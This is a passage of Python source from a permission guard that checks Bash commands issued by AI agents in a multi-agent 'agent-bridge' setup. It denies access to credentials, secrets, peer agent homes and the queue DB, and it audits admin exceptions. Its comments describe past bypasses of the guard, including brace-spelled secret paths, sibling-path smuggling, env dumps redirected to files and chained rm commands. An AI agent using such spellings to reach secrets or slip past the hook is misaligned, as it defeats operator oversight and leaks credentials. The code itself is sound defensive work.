        expanded = _expand_bridge_prefixes(raw_word)
        # A surviving `$` after expanding the KNOWN prefixes is an unresolved
        # arbitrary-var expansion — never provably safe.
        if "$" in expanded:
            return None
        # Only model path-shaped words (absolute after expansion). A bare flag
        # / option word (`-l`, `--color`) is not a path.
        if not expanded.startswith("/"):
            continue
        try:
            resolved = Path(expanded).resolve(strict=False)
        except (OSError, RuntimeError, ValueError):
            return None
        if _path_in_forbidden_tree(resolved):
            return None
        for peer_home in peer_homes:
            try:
                peer_resolved = peer_home.resolve(strict=False)
            except (OSError, RuntimeError):
                continue
            try:
                resolved.relative_to(peer_resolved)
            except ValueError:
                continue
            peer_refs.append((str(resolved), peer_home.name))
            break
    if not peer_refs:
        return None
    return peer_refs


def _resolved_write_target_containment(target_word: str, agent: str) -> tuple[str, str] | None:
    """Resolve a write-target path word and confirm RESOLVED-PATH containment
    inside the operator bridge home AND outside every hard-denied tree.

    Returns ``(resolved_target, target_agent)`` when the target provably
    lands inside the bridge home and NOT inside shared/private, shared/secrets,
    or a #341 protected-config path. ``target_agent`` is the peer whose home
    contains the target (for the audit row), or ``""`` when the target is a
    safe NON-peer bridge-home location (e.g. a ``backups/`` quarantine
    destination — the #1803 case #1 shape ``mv <peer> <bridge>/backups/…``).

    Returns ``None`` (the caller denies) when:

      - the word carries an unresolved expansion / glob / command-sub the
        analyzer cannot reduce to a literal — a hidden target is never a safe
        write carve-out (fail closed);
      - the resolved target (or, for a not-yet-existing target, its deepest
        EXISTING ancestor resolved through symlinks) escapes OUTSIDE the bridge
        home, e.g. a `..` traversal or a symlinked parent pointing at `/etc`;
      - the resolved target sits inside shared/private, shared/secrets, or a
        protected-config path.

    Containment is by RESOLVED PATH, not substring, so a symlink/`..` escape
    cannot masquerade as a contained write.
    """
    resolved_target = _resolve_word_through_symlinks(target_word)
    if resolved_target is None:
        return None
    bridge_home = bridge_home_dir()
    # Must stay under the operator bridge home (symlink-resolved on both
    # sides). A quarantine destination (backups/) and a peer workdir are both
    # under the bridge home; an escape to /etc or another user's tree is not.
    try:
        bridge_resolved = bridge_home.resolve(strict=False)
    except (OSError, RuntimeError):
        return None
    try:
        resolved_target.relative_to(bridge_resolved)
    except ValueError:
        return None
    # Hard-denied trees stay denied even for a contained write.
    if _path_in_forbidden_tree(resolved_target):
        return None
    # Tag the peer home (if any) the target lands in, for the audit row.
    target_agent = ""
    for peer_home in other_agent_homes(agent):
        try:
            peer_resolved = peer_home.resolve(strict=False)
        except (OSError, RuntimeError):
            continue
        try:
            resolved_target.relative_to(peer_resolved)
        except ValueError:
            continue
        target_agent = peer_home.name
        break
    return str(resolved_target), target_agent


# Filesystem-tree write commands the #1806 peer-home carve-out recognizes.
# Each is an op the admin runs for #1803 hygiene (quarantine a retired home,
# scaffold a workdir, copy a backup). mv/cp take ``[srcs…] dst``; mkdir/rmdir
# take ``[dirs…]`` (all positionals are write targets).
_PEER_WRITE_SRC_DST_CMDS: frozenset[str] = frozenset({"mv", "cp"})
_PEER_WRITE_DIR_CMDS: frozenset[str] = frozenset({"mkdir", "rmdir"})


def _admin_peer_write_operands(text: str) -> tuple[str, list[str], list[str]] | None:
    """Extract ``(operation, source_words, dest_words)`` for a single
    sanctioned filesystem-tree write, or ``None`` when *text* is not a clean
    single-stage write of a recognized shape.

    - ``mv``/``cp``: every positional except the last is a source; the last is
      the destination. (``mv a b c/`` → sources ``[a, b]``, dest ``[c/]``.)
    - ``mkdir``/``rmdir``: every positional is a destination; no sources.

    Strictly single-stage and metachar-free: any pipe / `;` / `&&` / `&` /
    output-or-input redirection / command-sub / heredoc makes the command
    un-modelable, so we return ``None`` (the caller denies). The operands are
    still each independently containment-checked by the caller — this
    extractor only names candidate tokens, it authorizes nothing.
    """
    if _command_has_shell_embedding(text):
        return None
    if any(op in text for op in ("|", ";", "&", "\n", "<", ">")):
        return None
    try:
        tokens = shlex.split(text, posix=True, comments=False)
    except ValueError:
        return None
    if not tokens:
        return None
    leaf = tokens[0].rsplit("/", 1)[-1]
    # None of mv/cp/mkdir/rmdir take a value-bearing short flag that consumes
    # the next positional in the shapes we allow, so a bare flag-skip is
    # sufficient. ``--`` is dropped (end-of-options marker).
    positionals = [t for t in tokens[1:] if t != "--" and not t.startswith("-")]
    if leaf in _PEER_WRITE_SRC_DST_CMDS:
        if len(positionals) < 2:
            return None
        return leaf, list(positionals[:-1]), [positionals[-1]]
    if leaf in _PEER_WRITE_DIR_CMDS:
        if not positionals:
            return None
        return leaf, [], list(positionals)
    return None


def _admin_sqlite3_task_db_audit(text: str, agent: str) -> str | None:
    """Issue #1806 (3e) — recognize an EXACT trusted-admin
    ``sqlite3 <task_db> …`` invocation and return the resolved task-db path
    for the audit row, or ``None`` when *text* is not that shape.

    Strict, single-stage, metachar-free (the caller also re-checks
    `_command_has_shell_embedding`): any pipe / `;` / `&&` / `&` / redirection /
    command-sub makes the command un-modelable, so we return ``None``. The
    FIRST positional argv token (the sqlite3 database argument) must resolve to
    EXACTLY the queue task DB; a sqlite3 against any other path falls through
    unchanged (its own gates apply). No SQL is parsed — the database-path
    identity is the entire boundary; SQL semantics are deliberately out of
    scope (a write SELECT/UPDATE is audited the same, since the policy is
    allow+audit for the admin, not read-only enforcement).
    """
    if any(op in text for op in ("|", ";", "&", "\n", "<", ">", "`")):
        return None
    if "$(" in text:
        return None
    try:
        tokens = shlex.split(text, posix=True, comments=False)
    except ValueError:
        return None
    if not tokens:
        return None
    if tokens[0].rsplit("/", 1)[-1] != "sqlite3":
        return None
    # First non-flag positional after `sqlite3` is the database path.
    db_word = None
    for tok in tokens[1:]:
        if tok == "--":
            continue
        if tok.startswith("-"):
            continue
        db_word = tok
        break
    if db_word is None:
        return None
    # Expand the bridge-known prefixes (`~`/$HOME/$BRIDGE_HOME); a surviving
    # `$` is an unresolved expansion → fail closed.
    expanded = _expand_bridge_prefixes(db_word)
    if "$" in expanded:
        return None
    try:
        candidate = Path(expanded).expanduser()
    except (ValueError, OSError):
        return None
    try:
        resolved_db = candidate.resolve(strict=False)
        resolved_task_db = task_db_path().resolve(strict=False)
    except (OSError, RuntimeError):
        return None
    if resolved_db != resolved_task_db:
        return None
    return str(resolved_task_db)


def protected_alias_reason(
    text: str,
    agent: str,
    tool_input: dict[str, Any] | None = None,
) -> str | None:
    admin = is_admin_agent(agent)
    # Issue #1806 — the STRICT, anti-spoof admin predicate. Every cross-agent
    # allow+audit loosening this change adds (peer-home read AND write,
    # expansion/glob downgrade, sqlite3) gates on THIS predicate, never on the
    # loose `admin` (which trusts the agent-writable SESSION-TYPE.md). Computed
    # once up front so the carve-outs below share one fail-closed source.
    trusted_admin = is_trusted_admin_agent_for_guard(agent)
    # The two checks below use shlex argv matching rather than substring
    # matching (closes #252). A Bash invocation that actually opens the
    # protected file still has to name the real path as a positional
    # argument; a mention inside a message body (`--body "…"`, `-m "…"`,
    # `--description "…"`, etc.) is skipped. `protected_path_reason`
    # continues to guard the non-Bash tool surfaces (Read/Write) with the
    # structurally-correct `Path ==` check.
    #
    # Order mirrors `protected_path_reason`: narrow roster / queue DB
    # messages first so existing smoke tests find their specific wording,
    # then the issue #341 generic system-config gate.
    #
    # Issue #383: classify the whole pipeline once. Read-intent (cat /
    # grep / head / tail / `agent-bridge config get` / etc.) bypasses
    # the roster + system-config gates; #341's audit chain only
    # protects WRITES, so a read should never be denied. Issue #1690:
    # the queue DB argv gate also honors read_intent now — a read of the
    # DB file does not mutate the queue. Any output redirection / write
    # tool / `sqlite3 … 'UPDATE …'` flips read_intent off (sqlite3 is not
    # on `_READ_INTENT_BASH_COMMANDS`) and stays denied; `agb` queue
    # commands remain the only sanctioned mutation surface.
    # Classify read-intent once, up front: the admin-credential-read
    # carve-out below needs the same classification the protected-path
    # gate uses, and there's no benefit to recomputing it after each
    # deny. Read-intent means every pipeline stage's leading command is
    # in `_READ_INTENT_BASH_COMMANDS` (cat / ls / stat / grep / head /
    # tail / etc.) — `sed -i` / `awk -i inplace` / any output
    # redirection disqualifies the whole invocation. See
    # `_is_read_intent_bash` for the full contract.
    read_intent = _is_read_intent_bash(text)
    # Issue #1690 r4 FIX 2: a read-intent command that spells a path via an
    # unresolved shell expansion ($VAR / ${VAR} / ~ / brace) hides a path
    # from the static analysis the protected-path carve-outs rely on, so a
    # forbidden sibling could be smuggled in (e.g. `cat <tasks.db>
    # ${BRIDGE_HOME}/shared/secrets/x` — the literal secrets path never
    # appears for the substring sibling gate to catch). When a protected-
    # path read carve-out is about to be GRANTED below, fail closed if this
    # is set: an unresolvable path spelling is never a safe carve-out read.
    # Scoped to the carve-out grants only, so a normal read of a NON-
    # protected path via $VAR/~ is unaffected (no carve-out → no check).
    # Accepted, documented over-block: a var/tilde-spelled read of a
    # protected path itself loses the carve-out — use a literal absolute
    # path or `agb`.
    read_carveout_blocked_by_expansion = read_intent and _has_unresolved_path_expansion(text)
    # Issue #1358 tactical carve-out — admin rotation-pool token
    # registration via the sanctioned `bash bridge-auth.sh claude-token
    # add --stdin …` shape. Evaluated BEFORE the substring-deny block
    # so an audit row is emitted on every sanctioned-shape admin
    # invocation (defense-in-depth visibility), regardless of whether
    # the substring rule would have fired. The shape gate is strict —
    # see `_is_admin_credential_routine` for the full contract. This is
    # the tactical scope of #1358 only; the sealed-paste root path is
    # tracked in the follow-up issue linked from the PR body.
    credential_routine_exempted = _is_admin_credential_routine(text, agent)
    if credential_routine_exempted:
        _emit_credential_routine_admin_exempted_audit(
            agent,
            text=text,
            tool_input=tool_input,
        )
    # Issue #1367 — sealed-paste token-FREE request emit. The
    # `bash bridge-auth.sh claude-token receive --request … --json` shape
    # carries NO token (the token is read echo-off from the operator's
    # tty by a SEPARATE operator-terminal receive), so it is not caught
    # by the credential-substring deny below; we emit a distinct audit
    # row here for the admin-initiated request so the sealed-paste
    # surface is grep-able. The `agb`/`agent-bridge auth …` spellings are
    # audited via `_admin_bridge_verb_check`. This only EMITS an audit
    # row — it does not bypass any deny (the request is already
    # token-free), so the credential-content deny ordering is unchanged.
    if _is_sealed_receive_request(text, agent):
        _emit_sealed_receive_request_audit(
            agent,
            text=text,
            tool_input=tool_input,
        )
    # Issue #1367 r2 (codex SECURITY) — close the bash-wrapper bypass. A
    # `bash bridge-auth.sh claude-token receive …` carries no token in its
    # argv (the token is read echo-off from the operator's tty), so the
    # credential-content denies below do NOT catch it, and because the
    # `bash` wrapper leaf is not `agb`/`agent-bridge` it also is NOT routed
    # through `_admin_bridge_verb_check` (which denies the token-accepting
    # receive for those two spellings). Without this gate the token-
    # accepting `bash bridge-auth.sh claude-token receive --id X --activate
    # --json` would fall through to the peer/shared check and be ALLOWED,
    # letting an agent Bash tool drive a token-accepting receive. Deny any
    # bash-wrapper `receive` UNLESS it is the strict token-free
    # `--request … --json` shape (the same tight allow-shape the `agb`
    # spelling uses in `_admin_bridge_verb_check`). The token-free request
    # stays allowed; everything else denies here, before the allowlist.
    if _is_bash_wrapper_receive(text) and not _sealed_receive_request_shape_matches(text):
        return SEALED_RECEIVE_BASH_DENY_REASON
    if _raw_mentions_claude_credentials(text):
        # Admin agents are the operator's deputy: their read-intent
        # diagnostic commands (e.g. `ls ~/.claude/.credentials.json`,
        # `stat $BRIDGE_RUNTIME_SECRETS_DIR/claude-oauth-tokens.json`)
        # need to succeed for credential-state triage. The deny stays
        # in force for write-intent commands and for non-admin agents.
        # Every bypass writes an audit row.
        if admin and read_intent:
            _emit_admin_credential_read_allowed(
                agent,
                tool="Bash",
                surface="raw_credentials_mention",
                sample=text,
                tool_input=tool_input,
            )
        elif credential_routine_exempted:
            # Sanctioned rotation routine shape — the audit row was
            # already emitted above. Skip the substring deny.
            pass
        else:
            return CLAUDE_CREDENTIAL_DENY_REASON
    # PR #799 r3 codex finding 1 — env-dump verbs revealed exported
    # OAuth tokens under the abandoned env-token path, bypassing the
    # substring deny above. Kept as a stale-env/manual-export guard.
    if _raw_dumps_process_environment(text):
        # Admin diagnostics may legitimately `env | grep BRIDGE_` or
        # `printenv` to inspect runtime state. Allowed only when the
        # pipeline is purely read-intent — the same gate keeps a
        # compromised admin from `env > /tmp/leak.txt`-style writes
        # because output redirection drops the read-intent flag.
        if admin and read_intent:
            _emit_admin_credential_read_allowed(
                agent,
                tool="Bash",
                surface="raw_env_dump",
                sample=text,
                tool_input=tool_input,
            )
        else:
            return CLAUDE_CREDENTIAL_DENY_REASON
    for credential_path in claude_credential_paths():
        if _bash_argv_references_path(text, credential_path):
            # Admin read-intent argv reference to a credential file
            # (e.g. `cat ~/.claude/.credentials.json | jq .`) — allow
            # with an audit row. Non-admin / write-intent stay denied.
            if admin and read_intent:
                _emit_admin_credential_read_allowed(
                    agent,
                    tool="Bash",
                    surface="argv_path",
                    sample=str(credential_path),
                    tool_input=tool_input,
                )
                break
            return CLAUDE_CREDENTIAL_DENY_REASON
    # Wrapper self-block carve-out: the sanctioned `agent-bridge config
    # set` wrapper layers its own caller-source + audit gate
    # (bridge-config.py). Without this carve-out the path-argv check
    # below denies the wrapper invocation because the protected path
    # appears as the wrapper's --path argument — leaving operators in a
    # deadlock where the deny message points back at the same wrapper
    # they just tried to call. Letting the wrapper through here only
    # delegates audit responsibility to the wrapper itself; non-operator
    # callers still get rejected at bridge-config.py.
    if _is_config_set_wrapper(text):
        return None
    # Issue #1734: the `config set-env` exact-shape, admin-only, anti-spoof
    # gate. Runs BEFORE the roster / system-config / peer-shared gates because
    # `set-env` names NO protected path in argv (the managed file is
    # implicit), so a malformed/spoofed call would otherwise fall through to a
    # silent allow at the peer/shared check. A sanctioned admin call is
    # allowed (the wrapper layers its own audit); a leading VAR=value spoof or
    # a non-admin caller is denied explicitly.
    set_env_allowed, set_env_deny = _config_set_env_check(text, agent, tool_input)
    if set_env_allowed:
        return None
    if set_env_deny is not None:
        return set_env_deny
    if _bash_argv_references_path(text, roster_local_path()):
        if read_intent:
            # Issue #1690 r4 FIX 2: an unresolved path-spelling expansion
            # hides a sibling path from the analysis — deny the carve-out.
            if read_carveout_blocked_by_expansion:
                return PATH_EXPANSION_CARVEOUT_DENY_REASON
            return None
        # Issue #1255 r2 — admin roster read carve-out is a strict
        # read-intent whitelist (cat / grep / head / `agent-bridge
        # config get` / …). r1 used a write-intent blacklist that
        # tolerated unknown stage leaders; codex r1 review showed that
        # let `python3 /tmp/mutator.py <roster>`, `my-mutator
        # <roster>`, and `git commit -F <roster>` slip past as
        # "non-write" while in fact mutating or leaking the roster
        # outside the `agent-bridge config set` audit chain. The
        # whitelist captures every shape #1255 was meant to unblock
        # (operator diagnostics: `cat $roster`, `grep BRIDGE $roster`,
        # `head -10 $roster`) without exposing arbitrary admin
        # binaries that happen to take the roster as an argv element.
        # Write paths still flow through the `agent-bridge config
        # set` wrapper carve-out above.
        if admin and _bash_command_has_read_intent(text):
            return None
        # Admin no longer bypasses the roster path (codex r1 #341 CP2);
        # mutations route through `agent-bridge config set`.
        if admin:
            return ROSTER_LOCAL_DENY_REASON
        return "shared roster secrets are not available inside Claude tool calls"
    if _bash_argv_references_path(text, task_db_path()):
        # Issue #1690: a read-only argv reference to the DB file
        # (`cat`/`ls -l`/`stat`/`file` $db) is a read, not a queue
        # mutation, so honor the read_intent classification. `read_intent`
        # is False for any write tool, output redirection into a file sink
        # (`> $db`, `>> $db`, numeric fd, `cmd > sink`), an unbalanced/
        # unparseable command, or a `sqlite3 … 'UPDATE …'` (sqlite3 is
        # deliberately NOT on `_READ_INTENT_BASH_COMMANDS`), so all of
        # those still hit the unconditional deny here. Fail-closed.
        #
        # Issue #1690 r2 (codex Phase-4): the read-intent case must NOT
        # `return None` here. Doing so short-circuited the LATER sibling
        # deny gates (Stage A shared/private+shared/secrets, Stage B peer-
        # home) for a command that names BOTH tasks.db and a forbidden
        # path — e.g. `cat $db $BRIDGE_HOME/shared/secrets/token.txt`
        # would be allowed because the tasks.db allow exited before the
        # shared/secrets deny could fire. Instead, only the tasks.db-
        # SPECIFIC deny is lifted: fall through and keep evaluating, so a
        # forbidden path in the same command is still denied downstream.
        # Issue #1806 (3e) — trusted-admin sqlite3 against the queue DB.
        # sqlite3 is deliberately NOT read-intent, so a `sqlite3 <task_db>
        # 'SELECT …'` read is denied by the `if not read_intent:` deny just
        # below (over-block #5). For a STRICT trusted-admin, allow+audit an
        # EXACT single-stage `sqlite3 <task_db> …` invocation. Fail-safe:
        # `_admin_sqlite3_task_db_audit` rejects ANY shell metachar/embedding
        # and requires the FIRST positional to resolve to EXACTLY the task DB
        # (no room for a forbidden sibling operand). We ALSO re-run the Stage-A
        # shared-forbidden + #341 system-config checks before allowing, so the
        # carve-out can never return allow ahead of those gates (the task-db
        # gate sits before Stage A in the linear flow). No SQL parser is the
        # boundary; the audit row records the full command. A non-admin
        # sqlite3, or a sqlite3 against a non-task-db path, falls through to the
        # unconditional `if not read_intent:` deny below.
        if (
            trusted_admin
            and not read_intent
            and not _command_has_shell_embedding(text)
        ):
            sqlite_db = _admin_sqlite3_task_db_audit(text, agent)
            if (
                sqlite_db is not None
                and not any(a in text for a in _shared_forbidden_aliases())
                and _forbidden_suffix_in_command(text, _shared_forbidden_suffixes())
                is None
                and not _bash_argv_references_system_config(text)
            ):
                write_audit(
                    "admin_sqlite3_task_db",
                    agent or "unknown",
                    {
                        "agent": agent or "unknown",
                        "target_path": sqlite_db,
                        "command": truncate_text(text, 240),
                        "tool": "Bash",
                    },
                )
                return None
        if not read_intent:
            return "direct queue DB access is blocked; use `agb` queue commands instead"
        # Issue #1690 r4 FIX 2: the read carve-out falls through to the
        # later sibling gates, but a var/tilde/brace-spelled sibling would
        # be invisible to them. Deny the carve-out when the command spells
        # a path via an unresolved expansion (`cat <tasks.db>
        # ${BRIDGE_HOME}/shared/secrets/x`).
        if read_carveout_blocked_by_expansion:
            return PATH_EXPANSION_CARVEOUT_DENY_REASON
    # Issue #341: system-config paths get the same argv-based check; the
    # wrapper command is the only normal mutation surface for writes.
    # Read-intent is allowed for all agents — see #383.
    if _bash_argv_references_system_config(text):
        if read_intent:
            # Issue #1690 r4 FIX 2: deny the carve-out on an unresolved
            # path-spelling expansion (a sibling could be hidden).
            if read_carveout_blocked_by_expansion:
                return PATH_EXPANSION_CARVEOUT_DENY_REASON
            return None
        return SYSTEM_CONFIG_DENY_REASON
    # Issue #6607 — anchored admin bridge-verb allowlist (replaces the
    # previous broad `if admin: return None` bypass that codex r1
    # rejected as a command-injection surface).
    #
    # The credential / env-dump / roster / queue / system-config gates
    # above already deny secret-bearing text and protected-path argv;
    # those denies fire BEFORE we get here, so a matched bridge verb
    # cannot smuggle secret content through. The allowlist's job is to
    # let admin (and, where the verb explicitly permits, non-admin) run
    # the three sanctioned cross-agent communication / token-management
    # verbs that legitimately reference peer agent homes inside their
    # argv — which would otherwise trip the peer-alias substring deny
    # below.
    #
    # `_admin_bridge_verb_check` returns:
    #   - (True, None): verb shape matched + role permitted + args safe.
    #       An audit row was emitted; allow.
    #   - (False, str): verb shape recognized but role / arg safety
    #       failed. Return the explicit deny reason so a traversal arg
    #       like `--body-file ../../secret` cannot fall through to the
    #       peer/shared check (which would silently allow it because
    #       `../../secret` does not reference a peer agent home).
    #   - (False, None): not a bridge-verb invocation; fall through.
    verb_allowed, verb_deny = _admin_bridge_verb_check(text, agent, tool_input)
    if verb_allowed:
        return None
    if verb_deny is not None:
        return verb_deny

    # Issue #539 follow-up — Stage A: shared/private/ and shared/secrets/
    # are off-limits for every non-admin agent regardless of class.
    # Substring deny because the path can ride inside a heredoc body or
    # a quoted blob the argv parser cannot surface as a clean token.
    #
    # Issue #1692 deliberately does NOT add an admin carve-out here. The
    # admin read-intent carve-out below covers PEER-HOME reads only; the
    # `shared/private` + `shared/secrets` forbidden subtrees hold operator
    # secrets and stay DENIED for every agent INCLUDING admin (codex
    # direction-consult: least privilege — admin is the operator's deputy
    # for sanctioned auditable workflows, not a blanket Bash reader of
    # arbitrary secret blobs). This keeps #1690's admin Stage-A teeth
    # (`cat <tasks.db> <shared/secrets/…>` stays DENY) intact. The non-
    # Bash `protected_path_reason` currently lets admin Reads bypass this
    # forbidden-subtree gate (its `if admin: return None` precedes the
    # check) — that over-permission is a separate follow-up, NOT the
    # parity target to copy into Bash.
    for forbidden_alias in _shared_forbidden_aliases():
        if forbidden_alias in text:
            return (
                "cross-agent access is blocked: shared/private and "
                "shared/secrets are off-limits"
            )

    # Issue #1709 — prefix-spelling-agnostic Stage-A suffix deny. The
    # enumerated alias loop above only covers absolute / `~` / `$HOME`
    # spellings; it MISSES the brace `${HOME}`, `$BRIDGE_HOME`,
    # `${BRIDGE_HOME}` (and any future env-var) spellings, a HIGH
    # confidentiality bypass (`cat ${HOME}/.agent-bridge/shared/secrets/x`
    # was ALLOWED). The suffix matcher catches every prefix spelling at
    # once (every spelling ends in `/shared/secrets` or `/shared/private`)
    # and fail-closes on ANSI-C `$'…'` / glob / backslash / command-sub
    # obfuscation of the suffix. This deny is unconditional, matching the
    # alias loop's existing all-agents-including-admin scope (the forbidden
    # secret/private subtrees stay off-limits for every Bash reader; the
    # admin asymmetry between Bash and the non-Bash `protected_path_reason`
    # Read path is tracked separately in #1711 and is NOT changed here).
    shared_suffix_hit = _forbidden_suffix_in_command(text, _shared_forbidden_suffixes())
    if shared_suffix_hit is not None:
        return (
            "cross-agent access is blocked: shared/private and "
            "shared/secrets are off-limits"
        )

    # Issue #1692 — admin read-intent carve-out for the Bash PEER-HOME
    # gate (Stage B) (retightened for #1806), mirroring the non-Bash
    # `protected_path_reason` admin read exemption for peer agent homes.
    # Without this an admin could `Read file_path=<peer>/MEMORY.md` but the
    # SAME read via Bash `cat`/`grep` was denied, blocking routine admin
    # triage. Placed AFTER the Stage A shared-forbidden deny so admin reads of
    # `shared/private|secrets` stay blocked (see above).
    #
    # SCOPE NOTE (#1806): this PRE-EXISTING peer-READ carve-out keeps its loose
    # `is_admin_agent` gate — reads are lower risk than the new WRITE/sqlite3
    # loosenings, and retightening an already-shipped path is out of #1806's
    # "new allow+audit" scope (it would also change behavior for existing
    # admin-read flows). The NEW #1806 loosenings (peer-WRITE 3a, expansion/glob
    # 3b/3c, sqlite3 3e) all gate on the STRICT `trusted_admin` predicate
    # instead, so a spoofed SESSION-TYPE.md can never unlock a cross-agent WRITE
    # or sqlite3. Otherwise NARROW and fail-closed, the read carve-out fires
    # ONLY when ALL hold:
    #   - `admin` — `is_admin_agent(agent)` (env id OR session-type).
    #   - `read_intent` — `_is_read_intent_bash(text)`. Fails closed on output
    #     redirection, in-place / output-file / external-exec reader forms
    #     (`sed -i`, `sort -o`, `uniq IN OUT`, `xxd`, `yq -i`/`-s`, `awk`
    #     in-program redirect/pipe/system, `find -delete/-exec`, pager `+cmd`,
    #     `rg --pre`, dangerous env prefixes) and on unquoted shell embeddings
    #     (#1690). An admin WRITE-intent peer command does NOT ride this read
    #     carve-out — it routes through the explicit peer-WRITE carve-out below
    #     (resolved-path contained) or the Stage B deny.
    #   - `not read_carveout_blocked_by_expansion` — a read spelled via an
    #     unresolved `$VAR`/`~`/brace expansion loses the carve-out (#1690 r4
    #     FIX 2): the literal protected path never appears for the substring
    #     gate, so a forbidden sibling could be smuggled in. Fail closed.
    #   - `not _command_has_shell_embedding(text)` — belt-and-suspenders
    #     re-check (single-quoted embeddings the `read_intent` unquoted-only
    #     check passes), mirroring the Stage B system-class guard.
    #
    # Emits a `system_cross_agent_read` audit row (one per matched peer alias).
    if (
        admin
        and read_intent
        and not read_carveout_blocked_by_expansion
        and not _command_has_shell_embedding(text)
    ):
        admin_peer_read_audited = False
        for peer_alias in _peer_alias_list(agent):
            if peer_alias in text:
                emit_system_cross_agent_read(
                    agent=agent,
                    target_path=peer_alias,
                    target_agent="",
                    tool="Bash",
                )
                admin_peer_read_audited = True
        if admin_peer_read_audited:
            return None

    # Issue #1806 (3b/3c) — trusted-admin read-intent EXPANSION/GLOB downgrade.
    # The over-blocks: `ls ~/.agent-bridge/agents/<peer>/logs/` and a glob read
    # of core files lose the #1692 peer-read carve-out because the `~`/glob
    # spelling sets `read_carveout_blocked_by_expansion` / trips the
    # obfuscation fail-close. For a STRICT trusted-admin we downgrade that
    # fail-close to allow+audit, but ONLY when the command is PROVABLY safe:
    # `_admin_read_expansion_provably_safe` expands the bridge-known prefixes,
    # rejects any surviving `$`-expansion / glob / command-sub, and re-checks
    # every resolved word against the forbidden trees + #341 config. It runs
    # AFTER Stage A (which already proved no shared/private|secrets resolution
    # via any spelling) and only fires for read-intent commands. If the proof
    # fails, we do NOT allow — the command stays denied (deny even for admin,
    # per the brief). Emits a `system_cross_agent_read` row per peer reference.
    if trusted_admin and read_intent and not _command_has_shell_embedding(text):
        provable = _admin_read_expansion_provably_safe(text, agent)
        if provable is not None:
            for resolved_path, target_agent in provable:
                emit_system_cross_agent_read(
                    agent=agent,
                    target_path=resolved_path,
                    target_agent=target_agent,
                    tool="Bash",
                )
            return None

    # Issue #1806 (3a) — admin peer-home WRITE carve-out: allow+audit a
    # filesystem-tree write (mv / cp / mkdir / rmdir) whose RESOLVED target is
    # CONTAINED under a peer agent home AND outside every hard-denied tree.
    # This unblocks the #1803 hygiene workflow (quarantine a retired home,
    # scaffold a peer workdir) that the operator was forced to hand-run.
    #
    # Fail-safe ordering: this runs AFTER the Stage A shared/private +
    # shared/secrets denies (and after the #341 system-config gate above), so
    # a `mv <peer> <backup>` command that also names a forbidden path has
    # already been denied. Containment is by RESOLVED PATH (symlink + `..`
    # folded), NOT substring — `_resolved_write_target_containment` rejects a
    # symlink/`..` escape and re-checks the resolved target against
    # shared/private, shared/secrets, and #341 protected-config. The command
    # must be a single, metachar-free simple write (no `;`/`&&`/`|`/redirect/
    # command-sub), so a `mv a b ; rm shared/secrets/x` sibling cannot ride.
    # Gated on the STRICT `trusted_admin` predicate; non-admin (and
    # SESSION-TYPE-spoofed) callers never reach the allow.
    if trusted_admin and not read_carveout_blocked_by_expansion:
        operands = _admin_peer_write_operands(text)
        if operands is not None:
            operation, source_words, dest_words = operands
            # Resolve EVERY operand (sources + destinations) and require each to
            # stay contained under the bridge home and outside the hard-denied
            # trees (shared/private, shared/secrets, #341 protected-config). A
            # single un-contained operand — a `..`/symlink escape, a forbidden
            # source like `mv shared/secrets/x <dst>`, or an out-of-bridge-home
            # target — denies the whole command (fail closed).
            resolved_sources: list[str] = []
            resolved_dests: list[tuple[str, str]] = []
            references_peer = False
            all_contained = True
            for word in source_words:
                contained = _resolved_write_target_containment(word, agent)
                if contained is None:
                    all_contained = False
                    break
                resolved_path, target_agent = contained
                resolved_sources.append(resolved_path)
                if target_agent:
                    references_peer = True
            if all_contained:
                for word in dest_words:
                    contained = _resolved_write_target_containment(word, agent)
                    if contained is None:
                        all_contained = False
                        break
                    resolved_path, target_agent = contained
                    resolved_dests.append((resolved_path, target_agent))
                    if target_agent:
                        references_peer = True
            # Only allow+audit when EVERY operand is contained AND the command
            # actually touches a peer home (source OR destination) — so a
            # benign same-home/non-peer write is NOT mis-audited as a
            # cross-agent write; it falls through to its normal handling.
            if all_contained and references_peer:
                source_repr = " ".join(resolved_sources)
                for resolved_target, target_agent in resolved_dests:
                    emit_admin_cross_agent_write(
                        agent=agent,
                        operation=operation,
                        resolved_source=source_repr,
                        resolved_target=resolved_target,
                        target_agent=target_agent,
                        command=text,
                    )
                return None

    # Stage B: peer-agent-home substring deny with a system-class
    # read-intent exception path. The default stance is deny: a system-
    # class agent earns the carve-out only when (1) the command is
    # smuggle-free and (2) every alias substring in raw text is
    # explained by a clean argv token whose resolved Path satisfies
    # `_system_class_cross_agent_read_allowed`.
    peer_aliases = _peer_alias_list(agent)
    matched_alias = next((a for a in peer_aliases if a in text), None)

    # Issue #1709 — prefix-spelling-agnostic Stage-B peer-home matcher. The
    # `_peer_alias_list` substring needles share the same brace/`$BRIDGE_HOME`
    # gap as Stage-A: a non-admin (class=user) `cat
    # ${HOME}/.agent-bridge/agents/<other>/MEMORY.md` matched NO alias and
    # fell through to the `return None` ALLOW below. The suffix matcher
    # (`/agents/<name>`) catches every prefix spelling and fail-closes on
    # obfuscation. Scoped to NON-ADMIN only so admin Bash behavior is
    # unchanged (the admin peer-read asymmetry between Bash and the non-Bash
    # `protected_path_reason` Read path is #1711, out of scope here). A
    # system-class agent that trips the suffix match still routes through
    # the legitimate argv carve-out below (its brace-spelled path will fail
    # the `_argv_occurrences_explain_text` proof and fail closed, which is
    # the correct stance for an un-analyzable spelling).
    if matched_alias is None and not admin:
        peer_suffix_hit = _forbidden_suffix_in_command(
            text, _peer_forbidden_suffixes(agent)
        )
        if peer_suffix_hit is not None:
            matched_alias = f"cross-agent home ({peer_suffix_hit})"

    if matched_alias is None:
        return None

    if not (read_intent and current_agent_class() == "system"):
        return f"cross-agent access is blocked: {matched_alias}"

    if _command_has_shell_embedding(text):
        return f"cross-agent access is blocked: {matched_alias}"

    decisions_and_flag = _bash_argv_protected_decisions(text, agent)
    if decisions_and_flag is None:
        return f"cross-agent access is blocked: {matched_alias}"

    decisions, all_allowed = decisions_and_flag
    if not all_allowed:
        return f"cross-agent access is blocked: {matched_alias}"

    if not _argv_occurrences_explain_text(text, peer_aliases, decisions):
        return f"cross-agent access is blocked: {matched_alias}"

    for path, audit_target, _peer_key in decisions:
        emit_system_cross_agent_read(
            agent=agent,
            target_path=str(path),
            target_agent=audit_target,
            tool="Bash",
        )
    return None


def tool_input_summary(tool_name: str, tool_input: dict[str, Any]) -> dict[str, Any]:
    if tool_name == "Bash":
        return {
            "command": truncate_text(str(tool_input.get("command") or ""), 240),
            "description": truncate_text(str(tool_input.get("description") or ""), 120),
        }
    for key in ("file_path", "path", "pattern", "url", "subagent_type", "description"):
        value = tool_input.get(key)
        if value:
            return {key: truncate_text(str(value), 240)}
